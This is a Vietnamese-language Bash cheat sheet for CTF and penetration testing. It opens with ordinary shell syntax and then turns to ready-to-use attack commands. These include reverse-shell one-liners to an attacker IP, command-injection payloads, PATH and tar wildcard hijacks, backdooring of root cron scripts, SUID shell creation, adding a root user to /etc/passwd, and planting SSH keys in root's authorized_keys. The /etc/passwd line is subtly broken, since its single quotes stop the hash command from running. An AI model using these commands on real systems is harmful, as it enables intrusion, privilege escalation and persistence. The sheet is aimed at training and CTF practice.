# 🐚 Bash & Shell Scripting Cheat Sheet — CTF & Pentest

> Chỉ dùng trên hệ thống được phép kiểm thử.

---

## 📚 1. Bash Fundamentals (theo docs)

### Variables & Types

```bash
# Khai báo
name="hello"
num=42
readonly CONST="immutable"

# Unset
unset name

# Special Variables
$0          # Tên script
$1..$9      # Positional arguments
$@          # Tất cả arguments (array)
$*          # Tất cả arguments (string)
$#          # Số lượng arguments
$?          # Exit code lệnh trước
$$          # PID của shell hiện tại
$!          # PID của background process cuối
$_          # Argument cuối của lệnh trước
$IFS        # Internal Field Separator (mặc định: space/tab/newline)

# Arrays
arr=("a" "b" "c")
echo ${arr[0]}       # a
echo ${arr[@]}       # Tất cả
echo ${#arr[@]}      # Số phần tử
arr+="d"             # Append
```

### Parameter Expansion

```bash
${var}              # Basic expansion
${var:-default}     # Dùng default nếu var unset/empty
${var:=default}     # Gán default nếu var unset/empty
${var:?error_msg}   # Exit với lỗi nếu unset
${var:+other}       # Dùng other nếu var ĐÃ set

# String manipulation
${#var}             # Độ dài string
${var:2}            # Substring từ index 2
${var:2:4}          # Substring index 2, dài 4
${var#prefix}       # Xóa prefix ngắn nhất
${var##prefix}      # Xóa prefix dài nhất
${var%suffix}       # Xóa suffix ngắn nhất
${var%%suffix}      # Xóa suffix dài nhất
${var/old/new}      # Replace lần đầu
${var//old/new}     # Replace tất cả
${var^^}            # Uppercase
${var,,}            # Lowercase

# Indirect expansion
varname="PATH"
echo ${!varname}    # In ra giá trị của $PATH
```

### Expansion Order (quan trọng để hiểu injection)

```
1. Brace expansion         {a,b,c}
2. Tilde expansion         ~
3. Parameter expansion     $var ${var}
4. Command substitution    $(cmd) hoặc `cmd`
5. Arithmetic expansion    $((expr))
6. Word splitting          IFS
7. Glob/Pathname           * ? [...]
8. Quote removal
```

---

## 📝 2. Control Flow

### Conditionals

```bash
# if/elif/else
if [ condition ]; then
    ...
elif [[ condition ]]; then
    ...
else
    ...
fi

# Test operators — [ ] vs [[ ]]
# [ ] = POSIX sh, [[ ]] = bash built-in (mạnh hơn)

# Numeric
[ $a -eq $b ]   # equal
[ $a -ne $b ]   # not equal
[ $a -lt $b ]   # less than
[ $a -gt $b ]   # greater than
[ $a -le $b ]   # less or equal
[ $a -ge $b ]   # greater or equal
(( a == b ))    # Arithmetic test

# String
[ "$a" = "$b" ]     # equal
[ "$a" != "$b" ]    # not equal
[ -z "$a" ]         # empty string
[ -n "$a" ]         # non-empty
[[ "$a" =~ regex ]] # regex match (chỉ [[ ]])
[[ "$a" == *pattern* ]] # glob match

# File tests
[ -e file ]    # exists
[ -f file ]    # regular file
[ -d file ]    # directory
[ -r file ]    # readable
[ -w file ]    # writable
[ -x file ]    # executable
[ -s file ]    # non-empty
[ -L file ]    # symlink
[ -u file ]    # SUID set
[ -g file ]    # SGID set
[ file1 -nt file2 ]  # newer than
[ file1 -ot file2 ]  # older than

# Logical
[ cond1 ] && [ cond2 ]    # AND
[ cond1 ] || [ cond2 ]    # OR
[[ cond1 && cond2 ]]      # AND (bash)
! [ condition ]            # NOT
```

### Loops

```bash
# for
for i in {1..10}; do echo $i; done
for i in $(seq 1 10); do echo $i; done
for ((i=0; i<10; i++)); do echo $i; done
for file in /etc/*.conf; do echo $file; done

# while
while [ condition ]; do ...; done
while read line; do echo $line; done < file.txt
while true; do ...; sleep 1; done    # Infinite loop

# until
until [ condition ]; do ...; done

# Loop control
break        # Thoát loop
continue     # Skip iteration
break 2      # Thoát 2 level loop
```

### Case

```bash
case $var in
    "start") echo "starting" ;;
    "stop")  echo "stopping" ;;
    *.txt)   echo "text file" ;;
    [0-9]*)  echo "starts with number" ;;
    *)       echo "default" ;;
esac
```

---

## ⚙️ 3. Functions

```bash
# Khai báo
function myFunc() {
    local var="local"    # Local variable
    echo $1              # Argument
    return 0             # Exit code
}
myFunc() { ... }         # Cú pháp ngắn hơn

# Gọi
myFunc arg1 arg2

# Lấy output
result=$(myFunc)

# Subshell vs current shell
( commands )             # Subshell, không ảnh hưởng env hiện tại
{ commands; }            # Current shell (cần ; và space)
```

---

## 🔄 4. I/O Redirection & Pipes

```bash
# Redirection
cmd > file          # stdout → file (overwrite)
cmd >> file         # stdout → file (append)
cmd < file          # stdin ← file
cmd 2> file         # stderr → file
cmd 2>&1            # stderr → stdout
cmd &> file         # stdout + stderr → file
cmd > /dev/null 2>&1  # Vứt hết output

# Here documents
cat << EOF
text here
$variable_expanded
EOF

cat << 'EOF'        # Single quote → không expand variable
literal $var
EOF

# Here string
grep "pattern" <<< "$variable"

# Process substitution
diff <(cmd1) <(cmd2)        # Dùng output của cmd như file
cmd > >(tee file)           # Vừa in ra vừa ghi file

# Pipes
cmd1 | cmd2 | cmd3
cmd1 |& cmd2                # Pipe stdout + stderr
```

---

## 🛠️ 5. Useful Built-ins & Commands

```bash
# Xử lý text
cut -d: -f1 /etc/passwd     # Lấy field 1, delimiter :
awk -F: '{print $1}' /etc/passwd
sed 's/old/new/g' file
grep -r "pattern" dir/
grep -v "exclude" file      # Invert match
sort | uniq -c | sort -rn   # Đếm + sort phổ biến nhất
tr 'a-z' 'A-Z'              # Translate characters
base64 -d                   # Decode base64

# Tìm kiếm
find / -name "*.txt" 2>/dev/null
find / -perm -4000 2>/dev/null          # SUID files
find / -writable -type f 2>/dev/null    # Writable files
find / -user root -type f 2>/dev/null
locate filename

# Network
nc -lvnp 4444               # Listen
nc -zv host 1-1000          # Port scan
curl -s http://host/file
wget -q -O- http://host/file

# Process
ps aux
ps -ef
pgrep -la process_name
kill -9 PID
jobs; fg; bg

# xargs
find . -name "*.log" | xargs rm
echo "host1 host2" | xargs -I{} ssh {} "uptime"
```

---

## 💀 6. Script Vulnerabilities — Các lỗi phổ biến & khai thác

### 6.1 Command Injection (dạng hay gặp nhất trong CTF)

```bash
# === Lỗi: Unquoted variable as command ===
$userinput 2>/dev/null      # Bare variable execution
eval "$userinput"           # eval với input không sanitize

# Khai thác:
# Input: /bin/bash
# Input: bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# === Lỗi: Variable trong command string ===
system("ping -c 1 " + input)   # Trong Python/PHP gọi bash
cmd="ls $userdir"
eval $cmd

# Khai thác:
# Input: .; /bin/bash
# Input: $(bash -i >& /dev/tcp/IP/PORT 0>&1)
# Input: `id`
# Input: | /bin/bash

# === Lỗi: Không quote biến trong [ ] ===
if [ $input = "yes" ]; then   # Lỗi: thiếu quotes
# Input: "a = a -o 1" → luôn true (logic injection)
```

### 6.2 Path Injection

```bash
# === Script dùng relative path ===
#!/bin/bash
python script.py            # Tìm python trong $PATH

# Khai thác:
mkdir -p /tmp/evil
echo '#!/bin/bash' > /tmp/evil/python
echo '/bin/bash -p' >> /tmp/evil/python
chmod +x /tmp/evil/python
export PATH=/tmp/evil:$PATH
sudo /path/to/script.sh     # Chạy /tmp/evil/python thay vì /usr/bin/python

# === Script dùng tên command không đầy đủ path ===
date    # vs /usr/bin/date
id      # vs /usr/bin/id
```

### 6.3 Wildcard Injection

```bash
# === Script dùng wildcard ===
tar czf backup.tgz *        # Wildcard trong thư mục

# Khai thác: tạo file tên giống option
cd /tmp/attacker_dir
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> shell.sh
chmod +x shell.sh
# Khi script chạy: tar czf backup.tgz * → expand thành options

# Tương tự với rsync, chown, chmod
echo "" > "--chmod=+s"
chown root:root *           # → chown root:root --chmod=+s
```

### 6.4 IFS Injection

```bash
# Nếu script split string với IFS mặc định
IFS=: read -ra parts <<< "$input"

# Hoặc loop qua output
for item in $list; do ...   # Không quote → word splitting

# Khai thác: inject newline hoặc IFS chars
input="safe_value; malicious_command"
```

### 6.5 Script Read Sensitive Data

```bash
# Nếu script backup, log, hoặc process files
# Tìm script chạy với root mà đọc/ghi file mình control

# Script write đến file mình control:
cp /etc/shadow /tmp/backup   # Mình đọc được /tmp/backup

# Script source file mình control:
source /tmp/config.sh        # Inject code vào config.sh
. /home/user/settings        # Tương tự
```

---

## 🔍 7. Enumeration với Bash (khi đã vào được shell)

```bash
# === System Info ===
uname -a
cat /etc/os-release
cat /proc/version
hostname

# === Users ===
whoami; id
cat /etc/passwd
cat /etc/shadow           # Cần root
w; who; last              # Users đang login

# === Sudo ===
sudo -l
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# === SUID/SGID ===
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
find / -perm -6000 -type f 2>/dev/null   # Both

# === Writable Paths ===
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null
ls -la /tmp /var/tmp /dev/shm

# === Cron Jobs ===
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
find / -name "*.sh" -type f 2>/dev/null | xargs ls -la

# === Services & Ports ===
ss -tlnp
netstat -tlnp 2>/dev/null
ps aux
systemctl list-units --type=service

# === PATH & Environment ===
echo $PATH
env
printenv

# === Capabilities ===
getcap -r / 2>/dev/null

# === NFS ===
cat /etc/exports
showmount -e localhost

# === Interesting Files ===
find / -name "*.txt" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.bak" 2>/dev/null
find / -name "config*" 2>/dev/null | grep -v proc
ls -la ~/.ssh/
cat ~/.bash_history
cat ~/.bashrc ~/.bash_profile
```

---

## 🌐 8. Reverse Shells bằng Bash

```bash
# === Bash TCP ===
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# === Bash UDP ===
bash -i >& /dev/udp/10.10.10.10/4444 0>&1

# === Upgrade shell sau khi có reverse shell ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 columns 116      # Adjust to your terminal size

# === One-liner alternatives ===
sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f

# === Listener (attacker side) ===
nc -lvnp 4444
rlwrap nc -lvnp 4444    # Với arrow keys support
```

---

## ⚡ 9. Cron Job Exploitation

```bash
# === Scenario: Cron chạy script root, mình có quyền ghi script ===
ls -la /path/to/cron/script.sh     # Kiểm tra permissions
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /path/to/script.sh

# === Scenario: Cron chạy với wildcard ===
# (xem phần Wildcard Injection)

# === Scenario: Script source file mình control ===
# Cron script: source /home/user/config
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > /home/user/config

# === Monitor cron bằng pspy ===
# Upload pspy64 lên target
chmod +x pspy64 && ./pspy64    # Xem tất cả process real-time
# Không cần root!
```

---

## 🔑 10. Khai thác Script chạy với SUID

```bash
# Tìm bash script có SUID:
find / -perm -4000 -name "*.sh" 2>/dev/null

# Nếu script gọi command không full path:
strings /path/to/suid_script    # Xem strings bên trong
ltrace /path/to/suid_script     # Trace library calls
strace /path/to/suid_script     # Trace system calls

# Hijack PATH:
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
/path/to/suid_script            # → Spawn root shell
```

---

## 🎯 11. CTF Patterns Hay Gặp (IPPSec Style)

```bash
# === Pattern 1: Script với eval ===
eval "echo Hello $input"
# Input: $(id) hoặc `id`
# Input: $(bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1')

# === Pattern 2: Script backup dùng cp/tar ===
# cp $source $dest  → Path traversal + overwrite
# Input source: /etc/shadow
# Input dest: /var/www/html/shadow.txt → đọc qua web

# === Pattern 3: Script check/ping input ===
ping -c 1 $host
# Input: 127.0.0.1; id
# Input: 127.0.0.1 && cat /etc/shadow
# Input: 127.0.0.1 | bash -i >& /dev/tcp/IP/PORT 0>&1

# === Pattern 4: read + execute ===
read -p "Command: " cmd
$cmd           # Bare execution
# Input: /bin/bash

# === Pattern 5: Script tạo temp file predictable ===
tmpfile="/tmp/data-$RANDOM"
# Race condition: symlink attack
# ln -sf /etc/shadow /tmp/data-12345
# Brute force RANDOM (1-32767)

# === Pattern 6: Here document injection ===
cat << EOF > /tmp/output
User input: $input
EOF
# Input: $(id) → command substitution trong heredoc

# === Pattern 7: Source với path traversal ===
source /path/$(user_input)/config
# Input: ../../tmp/evil → source /tmp/evil
```

---

## 📋 12. Quick One-liners Hữu Ích

```bash
# Đọc file từng dòng
while IFS= read -r line; do echo "$line"; done < file.txt

# Check binary tồn tại
command -v python3 && echo "found"
which python3 perl ruby 2>/dev/null

# Generate wordlist
for i in {1..100}; do echo "password$i"; done

# Encode/Decode
echo "text" | base64
echo "dGV4dA==" | base64 -d
echo "text" | xxd
printf '%s' "text" | od -A n -t x1

# Tạo SUID bash nhanh
cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p

# Check writable /etc/passwd
ls -la /etc/passwd && [ -w /etc/passwd ] && echo "WRITABLE!"

# Add root user to /etc/passwd
echo 'hacker:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd

# SSH key generation + add
ssh-keygen -t rsa -b 2048 -f /tmp/key -N ""
cat /tmp/key.pub >> /root/.ssh/authorized_keys
ssh -i /tmp/key root@localhost
```

---

## 🔗 13. Resources

|Resource|Mô tả|
|---|---|
|[HackTricks - Bash](https://book.hacktricks.xyz/)|Toàn bộ kỹ thuật pentest|
|[GTFOBins](https://gtfobins.github.io/)|Shell escape cho mọi binary|
|[ExplainShell](https://explainshell.com/)|Giải thích từng phần lệnh shell|
|[pspy](https://github.com/DominicBreuker/pspy)|Monitor processes không cần root|
|[RevShells](https://revshells.com/)|Generator reverse shell|
|`man bash`|Official bash documentation|

---

> 💡 **IPPSec Tip:** Khi vào được shell, luôn chạy ngay:
> 
> ```bash
> id && sudo -l && cat /etc/crontab && find / -perm -4000 2>/dev/null
> ```
> 
> Bốn lệnh này cover 80% attack surface phổ biến nhất.